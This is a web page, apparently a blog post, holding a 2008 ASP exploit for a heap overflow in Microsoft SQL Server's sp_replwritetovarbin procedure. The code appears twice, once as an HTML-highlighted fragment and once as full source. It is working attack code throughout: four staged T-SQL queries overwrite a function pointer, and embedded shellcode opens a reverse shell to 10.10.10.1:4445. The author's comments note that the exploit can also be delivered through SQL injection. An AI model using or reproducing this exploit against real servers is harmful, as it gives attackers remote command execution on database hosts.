<span class="st0">&quot; &nbsp; &nbsp;SET @val = &nbsp;CHAR(0x43) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;IF @counter = 108&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* this is the pointer we wrote - 0x38. It points to a CALL ECX */&nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @buf = @buf + CHAR(0x10) + CHAR(0xc0) + CHAR(0x4c) + CHAR(0x19) &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* realign code */&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @buf = @buf + CHAR(0xe1) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* realign the stack */ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @buf = @buf + CHAR(0x83) + CHAR(0xe4) + CHAR(0xfc) &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* jump ahead */&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @buf = @buf + CHAR(0xe9) + CHAR(0xba) + CHAR(0x00) + CHAR(0x00) + CHAR(0x00) &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @counter = @counter + 12 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;CONTINUE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;ELSE IF @counter = 299 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp;SET @val = &nbsp;CHAR(0x42) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;ELSE IF @counter = 300 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;BEGIN&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* Fourth byte overwritten here */&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; SET @buf = @buf + CHAR(0x47) + char(0xc0) + char(0x4c) + CHAR(0x19) &quot;</span>&amp;_
&nbsp;
&nbsp;
<span class="st0">&quot; &nbsp; &nbsp; /* reverse shell on 10.10.10.1:4445 */&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; SET @buf=@buf+CHAR(0xfc)+CHAR(0x6a)+CHAR(0xeb)+CHAR(0x4d)+CHAR(0xe8)+CHAR(0xf9)+CHAR(0xff)</span>
<span class="st0">+CHAR(0xff)+CHAR(0xff)+CHAR(0x60)+CHAR(0x8b)+CHAR(0x6c)+CHAR(0x24)+CHAR(0x24)+CHAR(0x8b)</span>
<span class="st0">+CHAR(0x45)+CHAR(0x3c)+CHAR(0x8b)+CHAR(0x7c)+CHAR(0x05)+CHAR(0x78)+CHAR(0x01)+CHAR(0xef)</span>
<span class="st0">+CHAR(0x8b)+CHAR(0x4f)+CHAR(0x18)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x20)+CHAR(0x01)+CHAR(0xeb)</span>
<span class="st0">+CHAR(0x49)+CHAR(0x8b)+CHAR(0x34)+CHAR(0x8b)+CHAR(0x01)+CHAR(0xee)+CHAR(0x31)+CHAR(0xc0)</span>
<span class="st0">+CHAR(0x99)+CHAR(0xac)+CHAR(0x84)+CHAR(0xc0)+CHAR(0x74)+CHAR(0x07)+CHAR(0xc1)+CHAR(0xca)</span>
<span class="st0">+CHAR(0x0d)+CHAR(0x01)+CHAR(0xc2)+CHAR(0xeb)+CHAR(0xf4)+CHAR(0x3b)+CHAR(0x54)+CHAR(0x24)</span>
<span class="st0">+CHAR(0x28)+CHAR(0x75)+CHAR(0xe5)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x24)+CHAR(0x01)+CHAR(0xeb)</span>
<span class="st0">+CHAR(0x66)+CHAR(0x8b)+CHAR(0x0c)+CHAR(0x4b)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x1c)+CHAR(0x01)</span>
<span class="st0">+CHAR(0xeb)+CHAR(0x03)+CHAR(0x2c)+CHAR(0x8b)+CHAR(0x89)+CHAR(0x6c)+CHAR(0x24)+CHAR(0x1c)</span>
<span class="st0">+CHAR(0x61)+CHAR(0xc3)+CHAR(0x31)+CHAR(0xdb)+CHAR(0x64)+CHAR(0x8b)+CHAR(0x43)+CHAR(0x30)</span>
<span class="st0">+CHAR(0x8b)+CHAR(0x40)+CHAR(0x0c)+CHAR(0x8b)+CHAR(0x70)+CHAR(0x1c)+CHAR(0xad)+CHAR(0x8b)</span>
<span class="st0">+CHAR(0x40)+CHAR(0x08)+CHAR(0x5e)+CHAR(0x68)+CHAR(0x8e)+CHAR(0x4e)+CHAR(0x0e)+CHAR(0xec)</span>
<span class="st0">+CHAR(0x50)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x66)+CHAR(0x53)+CHAR(0x66)+CHAR(0x68)+CHAR(0x33)</span>
<span class="st0">+CHAR(0x32)+CHAR(0x68)+CHAR(0x77)+CHAR(0x73)+CHAR(0x32)+CHAR(0x5f)+CHAR(0x54)+CHAR(0xff)</span>
<span class="st0">+CHAR(0xd0)+CHAR(0x68)+CHAR(0xcb)+CHAR(0xed)+CHAR(0xfc)+CHAR(0x3b)+CHAR(0x50)+CHAR(0xff)</span>
<span class="st0">+CHAR(0xd6)+CHAR(0x5f)+CHAR(0x89)+CHAR(0xe5)+CHAR(0x66)+CHAR(0x81)+CHAR(0xed)+CHAR(0x08)</span>
<span class="st0">+CHAR(0x02)+CHAR(0x55)+CHAR(0x6a)+CHAR(0x02)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xd9)</span>
<span class="st0">+CHAR(0x09)+CHAR(0xf5)+CHAR(0xad)+CHAR(0x57)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x53)+CHAR(0x53)</span>
<span class="st0">+CHAR(0x53)+CHAR(0x53)+CHAR(0x43)+CHAR(0x53)+CHAR(0x43)+CHAR(0x53)+CHAR(0xff)+CHAR(0xd0)</span>
<span class="st0">+CHAR(0x68)+CHAR(0x0a)+CHAR(0x0a)+CHAR(0x0a)+CHAR(0x01)+CHAR(0x66)+CHAR(0x68)+CHAR(0x11)</span>
<span class="st0">+CHAR(0x5d)+CHAR(0x66)+CHAR(0x53)+CHAR(0x89)+CHAR(0xe1)+CHAR(0x95)+CHAR(0x68)+CHAR(0xec)</span>
<span class="st0">+CHAR(0xf9)+CHAR(0xaa)+CHAR(0x60)+CHAR(0x57)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x6a)+CHAR(0x10)</span>
<span class="st0">+CHAR(0x51)+CHAR(0x55)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x66)+CHAR(0x6a)+CHAR(0x64)+CHAR(0x66)</span>
<span class="st0">+CHAR(0x68)+CHAR(0x63)+CHAR(0x6d)+CHAR(0x6a)+CHAR(0x50)+CHAR(0x59)+CHAR(0x29)+CHAR(0xcc)</span>
<span class="st0">+CHAR(0x89)+CHAR(0xe7)+CHAR(0x6a)+CHAR(0x44)+CHAR(0x89)+CHAR(0xe2)+CHAR(0x31)+CHAR(0xc0)</span>
<span class="st0">+CHAR(0xf3)+CHAR(0xaa)+CHAR(0x95)+CHAR(0x89)+CHAR(0xfd)+CHAR(0xfe)+CHAR(0x42)+CHAR(0x2d)</span>
<span class="st0">+CHAR(0xfe)+CHAR(0x42)+CHAR(0x2c)+CHAR(0x8d)+CHAR(0x7a)+CHAR(0x38)+CHAR(0xab)+CHAR(0xab)</span>
<span class="st0">+CHAR(0xab)+CHAR(0x68)+CHAR(0x72)+CHAR(0xfe)+CHAR(0xb3)+CHAR(0x16)+CHAR(0xff)+CHAR(0x75)</span>
<span class="st0">+CHAR(0x28)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x5b)+CHAR(0x57)+CHAR(0x52)+CHAR(0x51)+CHAR(0x51)</span>
<span class="st0">+CHAR(0x51)+CHAR(0x6a)+CHAR(0x01)+CHAR(0x51)+CHAR(0x51)+CHAR(0x55)+CHAR(0x51)+CHAR(0xff)</span>
<span class="st0">+CHAR(0xd0)+CHAR(0x68)+CHAR(0xad)+CHAR(0xd9)+CHAR(0x05)+CHAR(0xce)+CHAR(0x53)+CHAR(0xff)</span>
<span class="st0">+CHAR(0xd6)+CHAR(0x6a)+CHAR(0xff)+CHAR(0xff)+CHAR(0x37)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)</span>
<span class="st0">+CHAR(0xe7)+CHAR(0x79)+CHAR(0xc6)+CHAR(0x79)+CHAR(0xff)+CHAR(0x75)+CHAR(0x04)+CHAR(0xff)</span>
<span class="st0">+CHAR(0xd6)+CHAR(0xff)+CHAR(0x77)+CHAR(0xfc)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xef)</span>
<span class="st0">+CHAR(0xce)+CHAR(0xe0)+CHAR(0x60)+CHAR(0x53)+CHAR(0xff)+CHAR(0xd6)&nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp; &nbsp; CONTINUE&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot; &nbsp;SET @buf = @buf + @val &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;END&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41''' &nbsp; &quot;</span>&amp;_
<span class="st0">&quot;EXEC master..sp_executesql @buf&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
&nbsp;
&nbsp;
<span class="kw4">Set</span> oConnection = Server.<span class="kw2">CreateObject</span>(<span class="st0">&quot;ADODB.Connection&quot;</span>)
oConnection.<span class="kw4">Open</span> <span class="st0">&quot;Provider=SQLOLEDB; Data Source=; Initial Catalog=; User ID=&quot;</span> &amp; UserName &amp; <span class="st0">&quot;; Password=&quot;</span> &amp; Password
<span class="kw4">Set</span> rs = Server.<span class="kw2">CreateObject</span>(<span class="st0">&quot;ADODB.Recordset&quot;</span>)
&nbsp;
phase = Request.Querystring(<span class="st0">&quot;p&quot;</span>)
&nbsp;
<span class="kw3">if</span> phase <span class="kw3">then</span>
&nbsp; &nbsp; <span class="kw3">if</span> phase = 1 <span class="kw3">then</span>
&nbsp; &nbsp; &nbsp; &nbsp; rs.<span class="kw4">open</span> SQL3, oConnection
&nbsp; &nbsp; &nbsp; &nbsp; rs.<span class="kw3">close</span>
&nbsp; &nbsp; &nbsp; &nbsp; oConnection.<span class="kw3">Close</span>
&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw4">Set</span> oConnection = <span class="kw5">Nothing</span>
&nbsp; &nbsp; &nbsp; &nbsp; Response.Redirect(<span class="st0">&quot;sql-exploit.asp?p=2&quot;</span>)
&nbsp; &nbsp; <span class="kw3">elseif</span> phase = 2 <span class="kw3">then</span>
&nbsp; &nbsp; &nbsp; &nbsp; rs.<span class="kw4">open</span> SQL4, oConnection
&nbsp; &nbsp; &nbsp; &nbsp; rs.<span class="kw3">close</span>
&nbsp; &nbsp; &nbsp; &nbsp; oConnection.<span class="kw3">Close</span>
&nbsp; &nbsp; &nbsp; &nbsp; <span class="kw4">Set</span> oConnection = <span class="kw5">Nothing</span>
&nbsp; &nbsp; &nbsp; &nbsp; Response.Redirect(<span class="st0">&quot;sql-exploit.asp?p=3&quot;</span>)
&nbsp; &nbsp; <span class="kw3">end</span> <span class="kw3">if</span>
<span class="kw3">Else</span>
&nbsp; &nbsp; rs.<span class="kw4">open</span> SQL, oConnection
&nbsp; &nbsp; rs.<span class="kw3">close</span>
&nbsp; &nbsp; oConnection.<span class="kw3">Close</span>
&nbsp; &nbsp; <span class="kw4">Set</span> oConnection = <span class="kw5">Nothing</span>
&nbsp; &nbsp; 
&nbsp; &nbsp; <span class="kw4">Set</span> oConnection = Server.<span class="kw2">CreateObject</span>(<span class="st0">&quot;ADODB.Connection&quot;</span>)
&nbsp; &nbsp; oConnection.<span class="kw4">Open</span> <span class="st0">&quot;Provider=SQLOLEDB; Data Source=; Initial Catalog=; User ID=&quot;</span> &amp; UserName &amp; <span class="st0">&quot;; Password=&quot;</span> &amp; Password
&nbsp; &nbsp; <span class="kw4">Set</span> rs = Server.<span class="kw2">CreateObject</span>(<span class="st0">&quot;ADODB.Recordset&quot;</span>)
&nbsp; &nbsp; rs.<span class="kw4">open</span> SQL2, oConnection
&nbsp; &nbsp; rs.<span class="kw3">close</span>
&nbsp; &nbsp; oConnection.<span class="kw3">Close</span>
&nbsp; &nbsp; <span class="kw4">Set</span> oConnection = <span class="kw5">Nothing</span> &nbsp; 
&nbsp;
&nbsp; &nbsp; Response.Redirect(<span class="st0">&quot;sql-exploit.asp?p=1&quot;</span>)
<span class="kw3">end</span> <span class="kw3">if</span>
&nbsp;
&nbsp;
%&gt;</pre></td></tr></tbody></table></div>
<div class="bwp-syntax-source"><pre class="no-parse">// k`sOSe 12/17/2008
&lt;%// Microsoft SQL Server "sp_replwritetovarbin()" Heap Overflow
// Tested on Win2k SP4 with MSSQL 2000(on one box only!).
// Shellcode is a slightly modified metasploit reverse shell(on 10.10.10.1 port 4445),
// the change allows multiple shots <img src="https://s.w.org/images/core/emoji/2/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" />
// 
// You need a valid SQL account, but you can also use this through an SQL-Injection simply by injecting the T-SQL stuff.

// Take a look at the comments in T-SQL



On Error Resume Next

// change this
UserName = "r00t"
Password = "t00r"

// ########################################### FIRST QUERY
SQL = "DECLARE @buf NVARCHAR(4000),				"&amp;_
"@val NVARCHAR(4),						"&amp;_
"@counter INT							"&amp;_
"SET @buf = '							"&amp;_ 
"declare @retcode int,						"&amp;_
"@end_offset int,						"&amp;_
"@vb_buffer varbinary,						"&amp;_
"@vb_bufferlen int						"&amp;_  
"exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' "&amp;_
"SET @val = CHAR(0x41)						"&amp;_
"SET @counter = 0						"&amp;_
"WHILE @counter &lt; 3020						"&amp;_
"BEGIN								"&amp;_
"  SET @counter = @counter + 1					"&amp;_
"  IF @counter = 2900						"&amp;_	 
"  BEGIN							"&amp;_
"    SET @val =  CHAR(0x43)					"&amp;_
"  END								"&amp;_
"  ELSE IF @counter = 299					"&amp;_
"  BEGIN							"&amp;_
"    SET @val =  CHAR(0x42)					"&amp;_
"  END								"&amp;_
"  ELSE IF @counter = 300					"&amp;_
"  BEGIN							"&amp;_


"     /* First byte overwritten here. This is a random writable address */	"&amp;_
"     SET @buf = @buf + CHAR(0x44) + char(0xc0) + char(0x4c) + CHAR(0x19) "&amp;_
"     CONTINUE							"&amp;_
"  END								"&amp;_
"  SET @buf = @buf + @val					"&amp;_
"END								"&amp;_
"SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''   "&amp;_
"EXEC master..sp_executesql @buf"							





// ########################################### SECOND QUERY
SQL2 = "DECLARE @buf NVARCHAR(4000),				"&amp;_
"@val NVARCHAR(4),						"&amp;_
"@counter INT							"&amp;_
"SET @buf = '							"&amp;_ 
"declare @retcode int,						"&amp;_
"@end_offset int,						"&amp;_
"@vb_buffer varbinary,						"&amp;_
"@vb_bufferlen int						"&amp;_  
"exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' "&amp;_
"SET @val = CHAR(0x41)						"&amp;_
"SET @counter = 0						"&amp;_
"WHILE @counter &lt; 3097						"&amp;_
"BEGIN								"&amp;_
"  SET @counter = @counter + 1					"&amp;_
"  IF @counter = 2900						"&amp;_	 
"  BEGIN							"&amp;_
"    SET @val =  CHAR(0x43)					"&amp;_
"  END								"&amp;_
"  ELSE IF @counter = 299					"&amp;_
"  BEGIN							"&amp;_
"    SET @val =  CHAR(0x42)					"&amp;_
"  END								"&amp;_
"  ELSE IF @counter = 300					"&amp;_
"  BEGIN							"&amp;_


"     /* Second byte overwritten here */			"&amp;_
"     SET @buf = @buf + CHAR(0x45) + char(0xc0) + char(0x4c) + CHAR(0x19) "&amp;_
"     CONTINUE							"&amp;_
"  END								"&amp;_
"  SET @buf = @buf + @val					"&amp;_
"END								"&amp;_
"SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''   "&amp;_
"EXEC master..sp_executesql @buf"							





// ########################################### THIRD QUERY
SQL3 = "DECLARE @buf NVARCHAR(4000),				"&amp;_
"@val NVARCHAR(4),						"&amp;_
"@counter INT							"&amp;_
"SET @buf = '							"&amp;_ 
"declare @retcode int,						"&amp;_
"@end_offset int,						"&amp;_
"@vb_buffer varbinary,						"&amp;_
"@vb_bufferlen int						"&amp;_  
"exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' "&amp;_
"SET @val = CHAR(0x41)						"&amp;_
"SET @counter = 0						"&amp;_
"WHILE @counter &lt; 3021						"&amp;_
"BEGIN								"&amp;_
"  SET @counter = @counter + 1					"&amp;_
"  IF @counter = 2900						"&amp;_	 
"  BEGIN							"&amp;_
"    SET @val =  CHAR(0x43)					"&amp;_
"  END								"&amp;_
"  ELSE IF @counter = 299					"&amp;_
"  BEGIN							"&amp;_
"    SET @val =  CHAR(0x42)					"&amp;_
"  END								"&amp;_
"  ELSE IF @counter = 300					"&amp;_
"  BEGIN							"&amp;_


"     /* Third byte overwritten here */				"&amp;_
"     SET @buf = @buf + CHAR(0x46) + char(0xc0) + char(0x4c) + CHAR(0x19) "&amp;_
"     CONTINUE							"&amp;_
"  END								"&amp;_
"  SET @buf = @buf + @val					"&amp;_
"END								"&amp;_
"SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''   "&amp;_
"EXEC master..sp_executesql @buf"							





// ########################################### FOURTH QUERY
SQL4 = "DECLARE @buf NVARCHAR(4000),				"&amp;_
"@val NVARCHAR(4),						"&amp;_
"@counter INT							"&amp;_
"SET @buf = '							"&amp;_ 
"declare @retcode int,						"&amp;_
"@end_offset int,						"&amp;_
"@vb_buffer varbinary,						"&amp;_
"@vb_bufferlen int						"&amp;_  
"exec master.dbo.sp_replwritetovarbin 120, @end_offset output, @vb_buffer output, @vb_bufferlen output,''' "&amp;_
"SET @val = CHAR(0x41)						"&amp;_
"SET @counter = 0						"&amp;_
"WHILE @counter &lt; 2708						"&amp;_
"BEGIN								"&amp;_
"  SET @counter = @counter + 1					"&amp;_
"  IF @counter = 2900						"&amp;_	 
"  BEGIN							"&amp;_
"    SET @val =  CHAR(0x43)					"&amp;_
"  END								"&amp;_
"  IF @counter = 108						"&amp;_
"  BEGIN							"&amp;_


"     /* this is the pointer we wrote - 0x38. It points to a CALL ECX */	"&amp;_
"    SET @buf = @buf + CHAR(0x10) + CHAR(0xc0) + CHAR(0x4c) + CHAR(0x19) "&amp;_


"     /* realign code */						"&amp;_
"    SET @buf = @buf + CHAR(0xe1)				"&amp;_


"     /* realign the stack */					"&amp;_
"    SET @buf = @buf + CHAR(0x83) + CHAR(0xe4) + CHAR(0xfc)	"&amp;_


"     /* jump ahead */						"&amp;_
"    SET @buf = @buf + CHAR(0xe9) + CHAR(0xba) + CHAR(0x00) + CHAR(0x00) + CHAR(0x00) "&amp;_
"    SET @counter = @counter + 12				"&amp;_
"    CONTINUE							"&amp;_
"  END								"&amp;_
"  ELSE IF @counter = 299					"&amp;_
"  BEGIN							"&amp;_
"    SET @val =  CHAR(0x42)					"&amp;_
"  END								"&amp;_
"  ELSE IF @counter = 300					"&amp;_
"  BEGIN							"&amp;_


"     /* Fourth byte overwritten here */			"&amp;_
"     SET @buf = @buf + CHAR(0x47) + char(0xc0) + char(0x4c) + CHAR(0x19) "&amp;_


"     /* reverse shell on 10.10.10.1:4445 */			"&amp;_
"     SET @buf=@buf+CHAR(0xfc)+CHAR(0x6a)+CHAR(0xeb)+CHAR(0x4d)+CHAR(0xe8)+CHAR(0xf9)+CHAR(0xff)
+CHAR(0xff)+CHAR(0xff)+CHAR(0x60)+CHAR(0x8b)+CHAR(0x6c)+CHAR(0x24)+CHAR(0x24)+CHAR(0x8b)
+CHAR(0x45)+CHAR(0x3c)+CHAR(0x8b)+CHAR(0x7c)+CHAR(0x05)+CHAR(0x78)+CHAR(0x01)+CHAR(0xef)
+CHAR(0x8b)+CHAR(0x4f)+CHAR(0x18)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x20)+CHAR(0x01)+CHAR(0xeb)
+CHAR(0x49)+CHAR(0x8b)+CHAR(0x34)+CHAR(0x8b)+CHAR(0x01)+CHAR(0xee)+CHAR(0x31)+CHAR(0xc0)
+CHAR(0x99)+CHAR(0xac)+CHAR(0x84)+CHAR(0xc0)+CHAR(0x74)+CHAR(0x07)+CHAR(0xc1)+CHAR(0xca)
+CHAR(0x0d)+CHAR(0x01)+CHAR(0xc2)+CHAR(0xeb)+CHAR(0xf4)+CHAR(0x3b)+CHAR(0x54)+CHAR(0x24)
+CHAR(0x28)+CHAR(0x75)+CHAR(0xe5)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x24)+CHAR(0x01)+CHAR(0xeb)
+CHAR(0x66)+CHAR(0x8b)+CHAR(0x0c)+CHAR(0x4b)+CHAR(0x8b)+CHAR(0x5f)+CHAR(0x1c)+CHAR(0x01)
+CHAR(0xeb)+CHAR(0x03)+CHAR(0x2c)+CHAR(0x8b)+CHAR(0x89)+CHAR(0x6c)+CHAR(0x24)+CHAR(0x1c)
+CHAR(0x61)+CHAR(0xc3)+CHAR(0x31)+CHAR(0xdb)+CHAR(0x64)+CHAR(0x8b)+CHAR(0x43)+CHAR(0x30)
+CHAR(0x8b)+CHAR(0x40)+CHAR(0x0c)+CHAR(0x8b)+CHAR(0x70)+CHAR(0x1c)+CHAR(0xad)+CHAR(0x8b)
+CHAR(0x40)+CHAR(0x08)+CHAR(0x5e)+CHAR(0x68)+CHAR(0x8e)+CHAR(0x4e)+CHAR(0x0e)+CHAR(0xec)
+CHAR(0x50)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x66)+CHAR(0x53)+CHAR(0x66)+CHAR(0x68)+CHAR(0x33)
+CHAR(0x32)+CHAR(0x68)+CHAR(0x77)+CHAR(0x73)+CHAR(0x32)+CHAR(0x5f)+CHAR(0x54)+CHAR(0xff)
+CHAR(0xd0)+CHAR(0x68)+CHAR(0xcb)+CHAR(0xed)+CHAR(0xfc)+CHAR(0x3b)+CHAR(0x50)+CHAR(0xff)
+CHAR(0xd6)+CHAR(0x5f)+CHAR(0x89)+CHAR(0xe5)+CHAR(0x66)+CHAR(0x81)+CHAR(0xed)+CHAR(0x08)
+CHAR(0x02)+CHAR(0x55)+CHAR(0x6a)+CHAR(0x02)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xd9)
+CHAR(0x09)+CHAR(0xf5)+CHAR(0xad)+CHAR(0x57)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x53)+CHAR(0x53)
+CHAR(0x53)+CHAR(0x53)+CHAR(0x43)+CHAR(0x53)+CHAR(0x43)+CHAR(0x53)+CHAR(0xff)+CHAR(0xd0)
+CHAR(0x68)+CHAR(0x0a)+CHAR(0x0a)+CHAR(0x0a)+CHAR(0x01)+CHAR(0x66)+CHAR(0x68)+CHAR(0x11)
+CHAR(0x5d)+CHAR(0x66)+CHAR(0x53)+CHAR(0x89)+CHAR(0xe1)+CHAR(0x95)+CHAR(0x68)+CHAR(0xec)
+CHAR(0xf9)+CHAR(0xaa)+CHAR(0x60)+CHAR(0x57)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x6a)+CHAR(0x10)
+CHAR(0x51)+CHAR(0x55)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x66)+CHAR(0x6a)+CHAR(0x64)+CHAR(0x66)
+CHAR(0x68)+CHAR(0x63)+CHAR(0x6d)+CHAR(0x6a)+CHAR(0x50)+CHAR(0x59)+CHAR(0x29)+CHAR(0xcc)
+CHAR(0x89)+CHAR(0xe7)+CHAR(0x6a)+CHAR(0x44)+CHAR(0x89)+CHAR(0xe2)+CHAR(0x31)+CHAR(0xc0)
+CHAR(0xf3)+CHAR(0xaa)+CHAR(0x95)+CHAR(0x89)+CHAR(0xfd)+CHAR(0xfe)+CHAR(0x42)+CHAR(0x2d)
+CHAR(0xfe)+CHAR(0x42)+CHAR(0x2c)+CHAR(0x8d)+CHAR(0x7a)+CHAR(0x38)+CHAR(0xab)+CHAR(0xab)
+CHAR(0xab)+CHAR(0x68)+CHAR(0x72)+CHAR(0xfe)+CHAR(0xb3)+CHAR(0x16)+CHAR(0xff)+CHAR(0x75)
+CHAR(0x28)+CHAR(0xff)+CHAR(0xd6)+CHAR(0x5b)+CHAR(0x57)+CHAR(0x52)+CHAR(0x51)+CHAR(0x51)
+CHAR(0x51)+CHAR(0x6a)+CHAR(0x01)+CHAR(0x51)+CHAR(0x51)+CHAR(0x55)+CHAR(0x51)+CHAR(0xff)
+CHAR(0xd0)+CHAR(0x68)+CHAR(0xad)+CHAR(0xd9)+CHAR(0x05)+CHAR(0xce)+CHAR(0x53)+CHAR(0xff)
+CHAR(0xd6)+CHAR(0x6a)+CHAR(0xff)+CHAR(0xff)+CHAR(0x37)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)
+CHAR(0xe7)+CHAR(0x79)+CHAR(0xc6)+CHAR(0x79)+CHAR(0xff)+CHAR(0x75)+CHAR(0x04)+CHAR(0xff)
+CHAR(0xd6)+CHAR(0xff)+CHAR(0x77)+CHAR(0xfc)+CHAR(0xff)+CHAR(0xd0)+CHAR(0x68)+CHAR(0xef)
+CHAR(0xce)+CHAR(0xe0)+CHAR(0x60)+CHAR(0x53)+CHAR(0xff)+CHAR(0xd6)		"&amp;_
"     CONTINUE							"&amp;_
"  END								"&amp;_
"  SET @buf = @buf + @val					"&amp;_
"END								"&amp;_
"SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''   "&amp;_
"EXEC master..sp_executesql @buf"							


Set oConnection = Server.CreateObject("ADODB.Connection")
